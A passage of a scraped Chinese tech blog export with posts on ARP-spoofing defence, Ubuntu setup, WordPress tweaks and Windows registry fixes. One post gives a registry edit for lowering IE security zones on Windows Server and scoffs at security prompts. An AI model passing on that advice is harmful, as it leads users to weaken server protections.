———–192.168.1.1 00-21-27-51-af-a4 Stale #网关ip-mac信息192.168.1.113 00-00-00-00-00-00 Unreachable224.0.0.251 01-00-5e-00-00-fb Permanentnetsh interface ipv4&gt;set neighbors “Local Area Connection” “192.168.1.1” “00-21-27-51-af-a4” #针对本地连接（此为英文系统，所以为 “Local Area Connection”，中文版的话是本地连接，一切以在网络连接那看到的为准）绑定网关ip-mac信息netsh interface ipv4&gt;quitC:\\Users\\&gt;arp -aInterface: 192.168.1.100 — 0x14Internet Address Physical Address Type192.168.1.1 00-21-27-51-af-a4 static #已经绑定好了224.0.0.251 01-00-5e-00-00-fb static Linux下绑定IP和MAC地址，防止ARP欺骗 原文出处：http:#www.xxLinux.com/Linux/article/network/security/20070809/9234.html 一、应用背景 由于最近网上新出现一种ARP欺骗病毒，主要表现为： 中病毒的机器不仅影响自身，同时也会影响同网段的其它机器，将其它机器的HTTP数据包里加入病毒代码。代码例子如： 这种病毒危害非常大！即使你机器的安全性做得很好，可是没办法保证同网段的其它机器安全没有问题！ 解决办法： 在网关和本机上双向绑定IP和MAC地址，以防止ARP欺骗。 二、约定 1、网关上已经对下面所带的机器作了绑定。网关IP：192.168.1.1 MAC：00:02:B3:38:08:62 2、要进行绑定的Linux主机IP：192.168.1.2 MAC：00:04:61:9A:8D:B2 三、绑定步骤 1、先使用arp和arp -a查看一下当前ARP缓存列表 12345[root@ftpsvr ~]# arpAddress HWtype HWaddress Flags Mask Iface192.168.1.234 ether 00:04:61:AE:11:2B C eth0192.168.1.145 ether 00:13:20:E9:11:04 C eth0192.168.1.1 ether 00:02:B3:38:08:62 C eth0 说明： Address：主机的IP地址 Hwtype：主机的硬件类型 Hwaddress：主机的硬件地址 Flags Mask：记录标志，”C”表示arp高速缓存中的条目，”M”表示静态的arp条目。 123[root@ftpsvr ~]# arp -a? (192.168.1.234) at 00:04:61:AE:11:2B [ether] on eth0? (192.168.1.1) at 00:16:76:22:23:86 [ether] on eth0 2、新建一个静态的mac–&gt;ip对应表文件：ip-mac，将要绑定的IP和MAC地下写入此文件，格式为 ip mac。 123[root@ftpsvr ~]# echo ‘192.168.1.1 00:02:B3:38:08:62 ‘ &gt; /etc/ip-mac[root@ftpsvr ~]# more /etc/ip-mac192.168.1.1 00:02:B3:38:08:62 3、设置开机自动绑定 1[root@ftpsvr ~]# echo ‘arp -f /etc/ip-mac ‘ &gt;&gt; /etc/rc.d/rc.local 4、手动执行一下绑定 1[root@ftpsvr ~]# arp -f /etc/ip-mac 5、确认绑定是否成功 123456789101112[root@ftpsvr ~]# arpAddress HWtype HWaddress Flags Mask Iface192.168.0.205 ether 00:02:B3:A7:85:48 C eth0192.168.1.234 ether 00:04:61:AE:11:2B C eth0192.168.1.1 ether 00:02:B3:38:08:62 CM eth0[root@ftpsvr ~]# arp -a? (192.168.0.205) at 00:02:B3:A7:85:48 [ether] on eth0? (192.168.1.234) at 00:04:61:AE:11:2B [ether] on eth0? (192.168.1.1) at 00:02:B3:38:08:62 [ether] PERM on eth0 从绑定前后的ARP缓存列表中，可以看到网关（192.168.1.1）的记录标志已经改变，说明绑定成功。 四、添加信任的Windows主机（192.168.1.10） 1、Linux主机（192.168.1.2）上操作 12[root@ftpsvr ~]# echo ‘192.168.1.10 00:04:61:AE:09:14’ &gt;&gt; /etc/ip-mac[root@ftpsvr ~]# arp -f /etc/ip-mac 2、Windows主机（192.168.1.10）上操作 1）清除ARP缓存 1C:\\Documents and Settings\\Administrator&gt;arp -d 2）绑定Linux主机的IP和MAC地址 1C:\\Documents and Settings\\Administrator&gt;arp -s 192.168.1.2 00-04-61-9A-8D-B2 你可以将上面2个步骤写在一个BAT（批处理）文件中，这样做的好处是，今后如果要增加其它机器的绑定，只需维护这个文件就可以了。例： 123456@echo offarp -darp -s 192.168.1.2 00-04-61-9A-8D-B2exit 注意：Linux和Widows上的MAC地址格式不同。Linux表示为：AA:AA:AA:AA:AA:AA，Windows表示为：AA-AA-AA-AA-AA-AA 五、参考文献 ARP协议揭密：http:#www.ibm.com/developerworks/cn/Linux/l-arp/","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"给博客添加一个Favicon","slug":"wordpress-favicon","date":"2015-12-08T15:48:38.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"wordpress-favicon.html","permalink":"https://sobaigu.com/wordpress-favicon.html","excerpt":"","text":"什么是Favicon： 显示在浏览器地址栏和收藏夹网站名字前面的那个图标。ie对这个功能支持的不是很好。 请只用为IE系列浏览器查看Wopus，查看sina，查看WordPress.org，一个很小的图片，这就是Favicon。至于Favicon的作用，毫不夸张的说，和Gravatar的作用一样。有时候看到这个标识，就能想到这个标识是属于哪个网站的。所以，给自己的WordPress添加一个Favicon是十分必要的。 第一步：先拥有一个Favicon.ico。 图片大小一般都是16px*16px。拥有Favicon图片的方法有很多，可以让做设计的朋友设计一个，也可以自己DIY一个，当然，也可以使用在线工作生成一个。Wopus这里提供三个，至于喜欢哪个，各位自己来。Favicon在线制作地址一；Favicon在线制作地址二；Favicon在线制作地址三 使用工具制作Favicon的时候，如果用PS，建议放弃，因为Favicon图片的后缀是.ico，可PS不允许保存为.ico文件，这里Wopus分享一款开源的Favicon制作工具，通过PS把图片做好之后，可以使用这个工具方便的把后缀变成.ico。工具名称：GIMP。 除了以上的资源，这里还分享一份在线的.ico转换工具：55+ Extremely Useful Online Generators. 第二步：上传并设置Favicon.ico 首先，找一个地址，把做好的Favicon上传，取得Favicon.ico的绝对路径（一般都放到根目录下）。然后到当前主题目录下，找到 header.php 文件。可以通过FTP工具把 header.php 下载到本地修改，也可以直接通过WordPress控制面板后台修改。然后把如下代码放置在 之前。 12&lt;link rel=&quot;icon&quot; href=&quot;http://yourdomain/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;&lt;link rel=&quot;shortcut icon&quot; href=&quot;yourdomain/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt; yourdomain：你WordPress博客的域名。 设置完成，这样你的WordPress就有Favicon图标了。 WordPress只所以强大，有爱好者连给WordPress增加一个Favicon都写了一个插件。插件名称：MaxBlogPress Favicon，但是WordPress本身的执行效率成问题，所以，这样的一个小设置是完全不需要试用插件来完成的。延伸阅读：10种提高WordPress访问速度的方法 欢迎评论亮出自己的博客的Favicon。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"Ubuntu不启动XWindows直接进命令行-转","slug":"ubuntu-no-xwindows","date":"2015-11-28T15:48:48.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"ubuntu-no-xwindows.html","permalink":"https://sobaigu.com/ubuntu-no-xwindows.html","excerpt":"Linux默认启动后进入XWindow，但可以修改参数直接进入命令行界面。到底是进入XWindow还是进入命令行界面，是在系统初始化进行的。 对于大部分Linux系统，初始化使用init进程， /etc/inittab 为其配置文件。","text":"Linux默认启动后进入XWindow，但可以修改参数直接进入命令行界面。到底是进入XWindow还是进入命令行界面，是在系统初始化进行的。 对于大部分Linux系统，初始化使用init进程， /etc/inittab 为其配置文件。 例如 1234# The default runlevel id:2:initdefault# Boot-time system configuration/initialization script si::sysinit:/etc/init.d/rcS# Runlevels l0:0:wait:/etc/init.d/rc 0 l1:1:wait:/etc/init.d/rc 1 l2:2:wait:/etc/init.d/rc 2 l3:3:wait:/etc/init.d/rc 3 l4:4:wait:/etc/init.d/rc 4 l5:5:wait:/etc/init.d/rc 5 l6:6:wait:/etc/init.d/rc 6 z6:6:respawn:/sbin/sulogin# How to react to ctrl-alt-del ca:12345:ctrlaltdel:/sbin/shutdown -t1 -a -r now 这些内容的通用格式为 id:runlevels:action:process： id 是惟一标识该项的字符序列 runlevels 定义了操作所使用的运行级别 action 指定了要执行的特定操作 process 定义了要执行的进程 对各个运行级的详细解释： 0为停机，机器关闭 1为单用户模式，就像Win9x下的安全模式类似 2为多用户模式，但是没有NFS支持 3为完整的多用户模式，是标准的运行级 4一般不用，在一些特殊情况下可以用它来做一些事情。例如在笔记本电脑的电池用尽时，可以切换到这个模式来做一些设置 5就是X11，进到X Window系统了 6为重启，运行init 6机器就会重启 XWindow是init5，字符是init3。将id设置为runlevel设置为3，就可以直接在系统初始化的时候直接进入文本界面。 但Ubuntu并没有采用init的方法，并没有 /etc/inittab这个文件。init使用的是串行的方式，引导很耗时。RedHat9启动时串行执行大量的脚本以启动各种需要的服务（启动时可以 看到）。Ubuntu采用了upstart，是一个基于事件的 init 的替代程序，用于 Ubuntu 发行版。 Ubuntu中没有 /etc/inittab这个文件，但用户可以自己添加。当系统中有 /etc/inittab 时Ubuntu会按照配置来启动。 所以要想直接进命令行，第一种方法是用户添加 /etc/inittab，不过Debian或是Ubuntu中默认run level是2，且2~5都是指X环境。（但命令行是几？不确定，尚未测试） 另外一种方法，可以考虑在对应的runlevel级别停止gdm服务： 12$ sudo mv /etc/rc2.d/S30gdm /etc/rc2.d/K30gdm#有可能是`S13gdm`，不一定 还可以把gdm删掉。先备份/etc/init.d/gdm到其它位置: 1$ sudo /etc/init.d/gdm /usr/gdm 然后删除/etc/init.d/gdm,删除后只是不启动XWindow,其它服务不变。需要直接进入XWindow到话，再复制回来。 其实如果仅仅是为了在命令行下的话，在xWindows界面下按Ctrl+Alt+F2 进入字符界面，按Ctrl+Alt+F7 回到图形界面。 还有一种方法： 12$sudo apt-get rcconf$sudo rcconf 在启动中将gdm去掉。另： 12sudo /etc/init.d/gdm stop #停止xWindowssudo /etc/init.d/gdm restart #重启xWindows 原文：http://hi.baidu.com/pleasenter/blog/item/331c3fc46b6da9c338db4956.html","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"解决WPS文字插入图表为灰色不可用","slug":"wps-insert-map","date":"2015-11-26T04:48:47.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"wps-insert-map.html","permalink":"https://sobaigu.com/wps-insert-map.html","excerpt":"","text":"WPS作为老牌办公编辑软件，现在越做越好了，慢慢地已经脱离了盗版MS office。 喜欢用绿色版软件，非正版系统经常折腾重装，免去安装各种软件的烦恼，WPS也不例外。使用绿色版软件会丢失一些关联，加载项什么的，在WPS中插入图表就是灰色的不可用状态。 此时，我们只需将对应关联注册表导入就可以解决，注册表如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Excel.Chart]@=&quot;Microsoft Office Excel 图表&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Excel.Chart\\CLSID]@=&quot;&#123;00020821-0000-0000-C000-000000000046&#125;&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Excel.Chart\\CurVer]@=&quot;Excel.Chart.8&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Excel.Chart.8]@=&quot;Microsoft Excel 图表&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Excel.Chart.8\\CLSID]@=&quot;&#123;00020821-0000-0000-C000-000000000046&#125;&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Excel.Chart.8\\DocObject][HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Excel.Chart.8\\Insertable][HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;]@=&quot;Microsoft Excel 图表&quot; &quot;IPersistStorageType&quot;=dword:00000001[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\AuxUserType][HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\AuxUserType\\2]@=&quot;Chart&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\AuxUserType\\3]@=&quot;Microsoft Excel 2003&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\DefaultExtension]@=&quot;.xls， Excel Workbook (*.xls)&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\DefaultIcon]@=&quot;C:\\Program Files (x86)\\Kingsoft\\WPS Office Professional\\office6\\et.exe，1&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\DocObject]@=&quot;16&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\InprocHandler32]@=&quot;ole32.dll&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\Insertable][HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\LocalServer32]@=&quot;C:\\Program Files (x86)\\Kingsoft\\WPS Office Professional\\office6\\et.exe&quot; &quot;LocalServer32&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\MiscStatus]@=&quot;1&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\ProgID]@=&quot;Excel.Chart.8&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\Verb]@=&quot;&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\Verb\\0]@=&quot;编辑(&amp;E)，0，2&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\Verb\\1]@=&quot;打开(&amp;O)，0，2&quot;[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID&#123;00020821-0000-0000-C000-000000000046&#125;\\Version]@=&quot;1.2&quot; 附件我就不放了，自行拷贝保存到reg类型文件再右键导入即可。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"Ubuntu 64位必会操作","slug":"ubuntu-x64-option","date":"2015-11-21T15:48:45.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"ubuntu-x64-option.html","permalink":"https://sobaigu.com/ubuntu-x64-option.html","excerpt":"","text":"转载自 zengxin45 64位Ubuntu 安装32位软件 1234#step1:装32位支持库sudo apt-get install ia32-libs*#step2:强行安装，以deb为例sudo dpkg -i –force-all 文件名 例 如: 12sudo dpkg -i –force-all /home/xxx/Download/Linuxqq_v1.0.2-beta1_i386.deb#其中”/home/xxx/Download”是我的默认下载目录 安装flash插件 进入adobe.com网http:#labs.adobe.com的flash下载页面,点击末尾的链接download64位的tar包解压成libflashplayer.so，在终端中以root身份复制到/usr/lib64 /mozilla/plugins内，重新启动FIREFOX应用正常，问题完美解决。详细方法见本站另一篇文章:64位Ubuntu安装flash控件 代码: 1sudo cp /home/xxx/Download/libflashplayer.so /usr/lib64/mozilla/plugins flash乱码解决方案 首先打开终端,输入 1234xxx@expired ~ $ cd /etc/fonts/conf.dxxx@expired ~ $ fc-list #看一下你安装了哪些字体，选择其中用中文显示的(比如文泉驿正黑),先记着这个字体xxx@expired ~ $ sudo cp 49-sansserif.conf 49-sansserif.conf_backup #这个是用来备份待会你要修改的文件的,可以不用操作xxx@expired ~ $ sudo gedit ./49-sansserif.conf #注意gedit后面有一个空格 打开系统文件，修改其中的代码如下 1234567891011121314&lt;match target=”pattern”&gt;&lt;test qual=”all” name=”family” compare=”not_eq”&gt;&lt;string&gt;文泉驿正黑&lt;/string&gt;&lt;/test&gt;&lt;test qual=”all” name=”family” compare=”not_eq”&gt;&lt;string&gt;文泉驿正 黑&lt;/string&gt;&lt;/test&gt;&lt;test qual=”all” name=”family” compare=”not_eq”&gt;&lt;string&gt;monospace&lt;/string&gt;&lt;/test&gt;&lt;edit name=”family” mode=”append_last”&gt;&lt;string&gt;文泉驿正 黑&lt;/string&gt;&lt;/edit&gt;&lt;/match&gt; 其实就是用文泉驿正黑代替了其中的4 个string中的2个sansserif和一个sansser代码，然后点击工具栏的save按钮保存，退出后重新启动firefox就可以了。 软件安装与卸載 deb包的安装方式 deb是debian系Linux的包管理方式，Ubuntu是属于debian系的Linux发行版，所以默认支持这种软件安装方式，当下载到一个 deb格式的软件后，在终端输入这个命令就能安装： 1sudo dpkg -i *.deb 编译安装方式 使用编译安装前，需要先建立编译环境，使用以下命令建立基本的编译环境： 1sudo apt-get install build-essential 在Linux的世界，有很多软件只提供了源代码给你，需要你自己进行编译安装，一般开源的软件都会使用tar.gz压缩档来进行发布，当然也有其他的形式.拿到源代码的压缩文档，把它解压到如/tmp目录下，进入/tmp/软件目录，然后执行以下三个命令： 123./configuremakesudo make install 在第一步./configure时可能会提示说有某某软件找不到，例如提示“libgnome”这个开发包找不到，那就把libgnome这个关键词 copy，然后打开新立得软件管理器，在里面搜索libgnome这个关键词，就会找到libgnome相关的项目，把前面有个Ubuntu符号的libgnome包(注意：同样需要安装dev包，但可以不装doc包)全部安装，通过这个方法把./configure过程中缺失的开发包都全部装上就OK了，第一步能顺利通过，第二,三步基本问题不大。 以上就是一般初学Ubuntu的朋友必须掌握的编译安装的基本方法！ apt-get安装方法 Ubuntu世界有许多软件源，在系统安装篇已经介绍过如何添加源，apt-get的基本软件安装命令是： 1sudo apt-get install 软件名 新立得软件包管理 打开：系统－－系统管理－－新立得软件包管理，这个工具其实跟apt一样，可以搜索,下载，安装Ubuntu源里的软件，具体安装方式很简单，看着界面应 该会懂，就不详细介绍了 二进制包的安装方式 有不少不开源的商业软件都会采用这种方式发布Linux软件，例如google earth,拿到二进制软件后，把它放到/tmp目录，在终端下进入安装目录，在安装目录下执行: 1./软件名 然后按照一步步提示，就能安装该软件 rpm包的安装方式 rpm包是deb包外最常见的一种包管理方式，但Ubuntu同样可以使用rpm的软件资源,首先我们需要安装一个rpm转deb的软件 1sudo apt-get install alien 然后就可以对rpm格式的软件转换成deb格式了： 1alien -d *.rpm 然后就可以用deb的安装方式进行软件安装,也可以不需转换而直接对rpm包进行安装： 1alien -i *.rpm 更多的alien使用方法可以用-h参数查看相应说明文档 其它安装方式 其他安装方式一般还有脚本安装方式，这类软件，你会在软件安装目录下发现类似后缀名的文件,如: .sh .py .run等等，有的甚至连后缀名都没有，直接只有一个INSTALL文件，对于这种软件，可尝试以下几种方式安装最简单的就是直接在软件目录下输入： ./软件名* (注意有一个*号，那是一般可以通配所有后缀名) 或者： sh 软件名.sh 或者： python 软件名.py 终端安装与卸载的常见命令 安装软件:apt-get install softname1 softname2 softname3…… 卸载软件:apt-get remove softname1 softname2 softname3…… 卸载并清除配置:apt-get remove --purge softname1 更新软件信息数据库:apt-get update 进行系统升级:apt-get upgrade 搜索软件包:apt-cache search softname1 softname2 softname3…… 安装deb软件包:dpkg -i xxx.deb 删除软件包:dpkg -r xxx.deb 连同配置文件一起删除:dpkg -r --purge xxx.deb 查看软件包信息:dpkg -info xxx.deb 查看文件拷贝详情:dpkg -L xxx.deb 查看系统中已安装软件包信息:dpkg --list 重新配置软件包:dpkg-reconfigure xxx 安装64位QQ举例: 下载地址 发现RAR无法打开终端执行 1sudo apt-get install rar 这时再打开文件就可以解压出的deb包了 Ubuntu最快输入法Fcitx(DEB包,同步官网最新版本)下载安装方法 : 123456789#卸载IBUS:sudo apt-get remove ibus#安装依赖包(如果不安装此依赖包输入法界面会乱码sudo apt-get install ttf-arphic-uming#下面地址下载最新版本Fcitx DEB包 安装方法地球人都会#http://code.google.com/p/fcitx/downloads/list#系统--首选项--启动应用程序 添加名称:Fcitx,然后输入命令:fcitx -d#修改设置在~/.config/fcitx目录下 的 config文件 然后重启电脑 删除未完成的任务 1sudo apt-get install build-essential 终端输入如上命令,将会罗列出如下信息: 正在读取软件包列 表… 完成 正在分析软件包的依赖关系树 读取状态信息… 完成 build-essential 已经是最新的版本了。 共升级了 0 个软件包，新安装了 0 个软件包，要卸载 0 个软件包，有 0 个软件未被升级。 有 1 个软件包没有被完全安装或卸载。 操作完成后，会消耗掉 0B 的额外磁盘空间。 正在设置 flashplugin-nonfree (10.0.1.218+10.0.0.525Ubuntu1~hardy1+really9.0.124.0Ubuntu2) … Downloading… –23:28:30-- http:#fpdownload.macromedia.com/get/flashplayer/current/install_flash_player_9_Linux.tar.gz … 子进程 post-installation script 被信号(中断)终止了 在处理时有错误 发生： flashplugin-nonfree E: Sub-process /usr/bin/dpkg returned an error code (1) chenwl@chenwl-laptop:~$ sudo apt-get uinstall install_flash_player_9_Linux.tar.gz E: 无效的操作 uinstall Ubuntu 3D桌面特效的详细设置 首先安装CompizConfig设置管理器（3D驱动必须装好） 1sudo apt-get install compizconfig-settings-manager 运行 系统-&gt;首选项-&gt;Advanced Desktop Effects Settings，点击General Compiz options，把Desktop Size选项卡里的“水平虚拟大小”设置为4，“垂直虚拟大小”设置为1，“桌面数”设置为4，后退，勾选“桌面立方体”“旋转立方体”“立方体倒映” “Cube Caps ”几项，按住Ctrl+alt，再按住鼠标左键移动，3D桌面效果出现。 在Gube Gears前面打钩，然后找到前面打过钩的桌面立方体，点击，选择Transparent Cube，将Opacity During Rotation降到50左右，再将3D桌面调出来，立方体成半透明的了，并且里面有三个齿轮在滚动！ 点击旋转立方体-&gt;一般，把缩放调整到1.0，把速度调整到0.7，再按Ctrl+alt+向左/向右键，可以看到立方体运动时的慢动作，并 且立方体小了很多。 将鼠标在桌面上的空白位置点击一下，然后转动鼠标的滚轮，出现旋转的3D桌面效果。按住Super键(Ctrl与Alt中间的那个键）+Tab键， 桌面水平排列。 进入调整大小-&gt;动作，点击一般前面的小三角，双击“启动所有窗口的窗口拾取器”，选中Topleft，点击OK。现在将你的鼠标移动到桌面 左上角，就能实现类似Mac os X的Expose特效了。 进入CompizConfig设置管理器的主界面，点击Expo-&gt;动作，在窗口中的Expo上面双击，勾选Top Right，然后OK。将鼠标移动到桌面的右上角，4个桌面整齐排列在一个3D空间内（同super+E效果），可以将窗口从一个桌面拖动到另一个桌面， 甚至放在两个桌面中间！ 在CompizConfig设置主界面选择Shift Switcher-&gt;动作-&gt;Initial(All workspace)下，勾选Bottomleft。鼠标移动到桌面的左下角，出现iPhone的Cover Flow特效。可以用鼠标滚轮和方向键切换桌面。回到Shift Switcher，点击外观，在Switcher mode中选择Flip。鼠标移动到桌面的左下角，出现Windows vista中的Flip3D特效。 在CompizConfig设置管理器主界面选择“在屏幕上绘制火焰”前面的复选框，现在就可以直接按住Super+shift键，然后用鼠 标左键在屏幕写了。火焰的默认颜色是红色，可以直接进入“在屏幕上绘制火焰”设置项里，调整火焰颜色，或者干脆“随机”，取消火焰的时候同时按 Super+Shift+C。 再次回到主界面中，勾选Windows Previews，这样将鼠标移动到任务栏会出现预览窗口。 在CCSM（CompizConfig设置管理器）主界面选择移动窗口，将其设置界面中的不透明度设置到60左右，这样你移动窗口的时候就会 有半透明的效果。 同样在主界面中选择General Options-&gt;Opacity Settings，点击ADD（添加）。在OpacityWindows 中输入Dock，OpacityWIndow Values输入数值80。再以同样的方式添加DropDownMenu和PopupMenu，数值都为80。输入完毕之后，不管是什么菜单，现在都是以 半透明的方式显示了，包括右键菜单。 在CCSM主界面中选择Animations-&gt;CloseAnimation，在窗口中的第一个Glide2上双击，然后从 CloseEffect的下拉菜单中选择Burn，这样每次关闭窗口的时候会有火焰的效果。 点击Effect Settings，找到下面的Fire，点击小三角形出现火焰选项，然后勾选其中的“随机颜色火焰”后面的复选框，火焰颜色随机。也可以去 OpenAnimation里设置开启窗口时的动画特效，或者就选“随机”。 fcitx小企鹅输入法无法启动的问题 第一种现象：安装后在终端输入“fcitx”能正常启动小企鹅输入法，但修改了配置文件后就 出现无法启动输入法的现象，其实这是配置文件出现了问题，其中有一项“使用托盘图标”，有些配置文件并没有这一项，结果没注意全部复制粘贴 fcitx就自动关闭了。所以在修改时应仔细对比一下自己的配置文件。 第二种现象：编译成功后注销重新登录，在终端输入“fcitx”无法启动小企鹅输入法，出现 一行提示，大致意思为另一个相同的fcitx进程正在运行，打开系统监视器，杀死正在运行的fcitx进程，再在终端输入“fcitx”，能正常启动了， 但按Ctrl+Space却无法输入。这种原因可能是你以前安装过fcitx，或系统自带的ibus输入法没有卸载干净，解决方法是：打开“新立得软件包 管理器”，搜索ibus，将搜索出来的结果全都右键标记删除，然后在终端输入gedit ~/.bashrc，把其中的export XMODIFIERS=&quot;@im=fcitx&quot;语句删除，再在终端输入sudo rm /etc/X11/xinit/xinput.d/zh_CN命令删除文件。最后再按照我的安装教程编译即可","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://sobaigu.com/tags/Ubuntu/"}]},{"title":"调整IE安全级别,解除IE增强安全配置限制","slug":"adjust-the-ie-safelevel","date":"2015-10-09T01:38:50.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"adjust-the-ie-safelevel.html","permalink":"https://sobaigu.com/adjust-the-ie-safelevel.html","excerpt":"","text":"在Windows server版本系统中,默认IE安全级别默认为最高.当我们直接资源管理器访问FTP下载时,将提示禁止下载. 用IE打开网页时,将有各种提示,IE增强安全配置各种弹窗,各种需要添加信任,安全谈不上,简直没法使用. 为了解决这个问题,我们需要将安全级别调低,在XP时代,调安全级别很简单的事,可在server版系统上,甚至win8开始,默认只显示一个高的安全级别,不嫌烦的可以在设置框中逐个看,逐个按自己的需求进行设置,然后点确认就可以了. 为了简化操作,我们也可以通过导入以下注册表将各级别设置显示出来. 1234Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3]&quot;MinLevel&quot;=dword:00010000 将以上内容保存成注册表(.reg,注意系统中把文件后缀显示出来,将txt改成reg)文件,双击或右键合并导入注册表,此时就将系统预置的所有安全级别显示出来了,打开安全设置下拉选择即可. IE&gt;设置&gt;internet选项&gt;安全标签&gt;自定义级别&gt;重置自定义设置中,选择自己要的级别,然后点击重置 到此,烦人的各种提示就没有了,没有骚扰的使用才是正道,真要有危险,Windows这种安全限制…呵呵!!","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"解决空间不支持压缩格式文件问题","slug":"solve-awardhost-gz-type-unsupport","date":"2015-08-06T23:45:44.000Z","updated":"2024-09-28T00:17:21.257Z","comments":true,"path":"solve-awardhost-gz-type-unsupport.html","permalink":"https://sobaigu.com/solve-awardhost-gz-type-unsupport.html","excerpt":"","text":"最近国内的空间到期了,而且再搞还需要我重新备案. 备案就备案,狗日的接入商还顺手打劫,说要交50大洋备案费,去他妈的中国官商勾结,果断把网站迁到天朝势力范围外!!! 国外免费空间比较多,个人比较中意bytehost的空间,但无奈申请两个账号得到的空间地址都被gfw墙了.现在在用的有俩,一个是德国的keliu空间,一个是美国的awardhost免费空间. 俩空间各有优势,keliu空间足够大,不限流量,但有很讨厌的弹出页广告,听说可以用敏感词让gfw发挥下作用,但这也只能是天朝势力范围访问看不到.awardhost空间小点,300m存储空间,mysql限制10m,有点小,当前还是够用,凑合吧. awardhost免费空间不支持压缩文件上传,也不提供在线解压功能,这点比较麻烦,刚好WordPress自带的tinymce编辑器可视化需要用到wp-tinymce.js.gz这个文件. 从WordPress的帮助中心找了个解决方法,就是修改wp-tinymce.php代码,让其直接调用wp-tinymce.js.gz解压后的wp-tinymce.js. 打开wp-includes\\js\\tinymcewp-tinymce.php可见如下代码: 12345678if ( isset($_GET[&#x27;c&#x27;]) &amp;&amp; 1 == $_GET[&#x27;c&#x27;] &amp;&amp; isset($_SERVER[&#x27;HTTP_ACCEPT_ENCODING&#x27;])&amp;&amp; false !== strpos( strtolower($_SERVER[&#x27;HTTP_ACCEPT_ENCODING&#x27;]), &#x27;gzip&#x27;) &amp;&amp; ( $file = get_file($basepath . &#x27;/wp-tinymce.js.gz&#x27;) ) ) &#123;header(&#x27;Content-Encoding: gzip&#x27;);echo $file;&#125; else &#123;echo get_file($basepath . &#x27;/tiny_mce.js&#x27;);&#125;exit; 从代码可见其调用了gzip方法读取wp-tinymce.js.gz,解决方法便是不用gzip,而是直接调用js文件,将其修改如下: 12345678910//if ( isset($_GET[&#x27;c&#x27;]) &amp;&amp; 1 == $_GET[&#x27;c&#x27;] &amp;&amp; 